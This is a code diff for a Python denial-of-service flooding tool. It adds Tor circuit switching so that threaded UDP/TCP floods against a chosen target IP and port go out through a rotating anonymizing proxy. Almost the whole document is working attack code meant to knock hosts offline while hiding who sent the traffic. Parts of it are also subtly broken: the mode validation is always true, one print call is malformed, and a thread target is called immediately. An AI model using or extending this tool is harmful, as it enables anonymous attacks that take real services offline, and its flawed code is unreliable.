@@ -10,7 +10,9 @@ import socket
 from threading import Thread
 from argparse import ArgumentParser
 # Site Modules
+from modules import tor_ip_switcher
 from modules import socks
+from modules.socks import ProxyConnectionError
 from modules.colorama import Fore
 
 # Colors
@@ -41,6 +43,9 @@ class Dos():
                     sock.set_proxy(proxy_type=socks.SOCKS5, addr="localhost", port=9050)
                     sock.connect((ip, port))
                     sock.send(data)
+            except ProxyConnectionError as ex:
+                print(RED + "Waiting for new Circuit :" ,ex, + RESET)
+                continue
             except Exception:
                 print(RED + "Error in TOR" + RESET)
                 sys.exit(0)
@@ -78,6 +83,7 @@ class Controller(Dos):
     """
 
     def __init__(self):
+
         # Time
         self.lt = time.localtime()
         self.time_hm = time.strftime("%H:%M")
@@ -96,6 +102,9 @@ class Controller(Dos):
                            Date: %d.%m.%y      | Time: %H:%M
                     
             """, self.lt)
+
+        # Tor
+        self.tor_pass = ""
 
     def arguments(self):
         """ Argument Parser for user input """
@@ -119,6 +128,8 @@ class Controller(Dos):
                 if args.dos_mode != 'udp' or 'tcp' or 'tor': raise Exception
                 elif args.port > 35535: raise Exception
                 elif args.buffer_size > 65507: raise Exception
+                elif args.dos_mode == 'tor':
+                    self.tor_pass = tor_ip_switcher.check_for_file()
                 return True
             except Exception as ex:
                 print("Use -h or --help for futher information :", ex)
@@ -146,6 +157,8 @@ class Controller(Dos):
             self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
         elif dos_mode == 'tor':
             self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
+            tor_thread = Thread(target=tor_ip_switcher.switch_ip(tor_pass=self.tor_pass))
+            tor_thread.start()
         try:
             for nr in range(int(amount)):
                 thread = Thread(target=self.dos, args=(target_ip, port, buffer_size))
